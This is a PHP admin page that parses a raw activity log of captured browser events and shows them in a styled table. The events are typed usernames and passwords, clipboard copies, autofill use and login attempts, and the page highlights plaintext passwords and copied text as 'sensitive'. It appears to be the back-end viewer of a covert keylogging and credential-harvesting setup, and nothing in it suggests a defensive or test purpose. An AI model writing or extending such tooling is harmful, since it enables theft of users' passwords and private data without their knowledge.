<?php
// credentials_table.php
$title = "Sensitive Credentials Extracted from Activity Log";
require_once '../includes/auth.php';
require_once '../includes/config.php';
require_once '../includes/db.php';

// Only allow admins to view this sensitive information
requireAdmin(); // Replacing isAdmin() with requireAdmin()

// Function to parse the log file and extract sensitive information
function extractSensitiveData($logContent) {
    $entries = [];
    $lines = explode("\n", $logContent);
    
    foreach ($lines as $line) {
        if (strpos($line, 'input_change') !== false || 
            strpos($line, 'password_autofill') !== false || 
            strpos($line, 'login_attempt') !== false ||
            strpos($line, 'copy') !== false) {
            
            $jsonStart = strpos($line, '{');
            if ($jsonStart === false) continue;
            
            $jsonStr = substr($line, $jsonStart);
            $data = json_decode($jsonStr, true);
            if (!$data) continue;
            
            $entry = [
                'timestamp' => $data['timestamp'] ?? '',
                'action' => $data['action'] ?? '',
                'page' => $data['page'] ?? '',
                'username' => '',
                'password' => '',
                'copied_text' => '',
                'autofill_field' => ''
            ];
            
            // Extract different types of sensitive data
            if ($data['action'] === 'input_change') {
                if (isset($data['name']) && $data['name'] === 'username') {
                    $entry['username'] = $data['newValue'] ?? '';
                }
                if (isset($data['name']) && $data['name'] === 'password') {
                    $entry['password'] = $data['newValue'] ?? '';
                }
            }
            elseif ($data['action'] === 'password_autofill') {
                $entry['autofill_field'] = $data['fieldName'] ?? '';
                $entry['action'] = 'Password Autofill';
            }
            elseif ($data['action'] === 'login_attempt') {
                $entry['username'] = $data['username'] ?? '';
                $entry['action'] = 'Login Attempt';
            }
            elseif ($data['action'] === 'copy') {
                $entry['copied_text'] = $data['text'] ?? '';
                $entry['action'] = 'Copied Text';
            }
            
            // Only add if we found something sensitive
            if (!empty($entry['username'])) $entry['type'] = 'Username';
            if (!empty($entry['password'])) $entry['type'] = 'Password';
            if (!empty($entry['copied_text'])) $entry['type'] = 'Copied Text';
            if (!empty($entry['autofill_field'])) $entry['type'] = 'Autofill';
            
            if (!empty($entry['type'])) {
                $entries[] = $entry;
            }
        }
    }
    
    return $entries;
}

// Read the log file
$logContent = file_get_contents('raw_activity.log');
$sensitiveData = extractSensitiveData($logContent);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title><?php echo htmlspecialchars($title); ?></title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        .security-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            font-size: 0.9em;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
        }
        .security-table thead tr {
            background-color: #215967;
            color: #ffffff;
            text-align: left;
        }
        .security-table th,
        .security-table td {
            padding: 12px 15px;
        }
        .security-table tbody tr {
            border-bottom: 1px solid #dddddd;
        }
        .security-table tbody tr:nth-of-type(even) {
            background-color: #f3f3f3;
        }
        .security-table tbody tr:last-of-type {
            border-bottom: 2px solid #215967;
        }
        .security-table tbody tr:hover {
            background-color: #e2efda;
        }
        .credential {
            font-family: monospace;
            color: #e74c3c;
        }
        .sensitive {
            background-color: #ffebee;
            font-weight: bold;
        }
        h1 {
            color: #215967;
            margin-bottom: 20px;
        }
        .container {
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1><?php echo htmlspecialchars($title); ?></h1>
        
        <table class="security-table">
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>Action</th>
                    <th>Page</th>
                    <th>Type</th>
                    <th>Credential/Sensitive Data</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($sensitiveData as $entry): ?>
                <tr>
                    <td><?php echo htmlspecialchars($entry['timestamp']); ?></td>
                    <td><?php echo htmlspecialchars($entry['action']); ?></td>
                    <td><?php echo htmlspecialchars($entry['page']); ?></td>
                    <td><?php echo htmlspecialchars($entry['type'] ?? ''); ?></td>
                    <td class="<?php echo ($entry['type'] === 'Password' || $entry['type'] === 'Copied Text') ? 'sensitive' : ''; ?>">
                        <span class="credential">
                            <?php 
                            if (!empty($entry['username'])) {
                                echo htmlspecialchars($entry['username']);
                            } elseif (!empty($entry['password'])) {
                                echo htmlspecialchars($entry['password']);
                            } elseif (!empty($entry['copied_text'])) {
                                echo htmlspecialchars(substr($entry['copied_text'], 0, 100)) . (strlen($entry['copied_text']) > 100 ? '...' : '');
                            } elseif (!empty($entry['autofill_field'])) {
                                echo 'Autofill detected in ' . htmlspecialchars($entry['autofill_field']);
                            }
                            ?>
                        </span>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</body>
</html>